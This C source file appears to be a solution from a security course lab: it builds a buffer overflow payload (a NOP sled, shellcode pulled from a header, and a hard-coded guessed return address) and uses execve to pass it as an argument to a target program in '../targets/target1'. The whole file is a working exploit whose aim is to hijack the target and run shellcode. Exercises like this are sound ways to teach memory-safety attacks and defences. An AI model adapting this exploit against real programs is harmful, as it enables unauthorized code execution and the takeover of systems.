#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
// Represent the address 0x0000000040a4fe01, reverted since little endian
#define GUESSED_ADDRESS "\x01\xfe\xa4\x40\x00\x00\x00\x00"
#define NOP 0x90
// 64bit machine, address is 2^64 = 8 bytes
#define ADDRESS_SIZE 8
#define ATTACK_STRING_SIZE 144

int
main ( int argc, char * argv[] )
{
	int SHELLCODE_LENGTH = strlen(shellcode);	
	char attack_str[ATTACK_STRING_SIZE];
	int NOP_SIZE = ATTACK_STRING_SIZE - SHELLCODE_LENGTH - ADDRESS_SIZE;
	// attack buffer = NOP + shellcode + guessed address
	memset(attack_str, NOP, NOP_SIZE);
	memcpy(attack_str + NOP_SIZE, shellcode, SHELLCODE_LENGTH);
	memcpy(attack_str + NOP_SIZE + SHELLCODE_LENGTH, GUESSED_ADDRESS, ADDRESS_SIZE);

	char *args[3];
	char *env[1];
	args[0] = TARGET;
	args[1] = attack_str;
	args[2] = NULL;
	
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
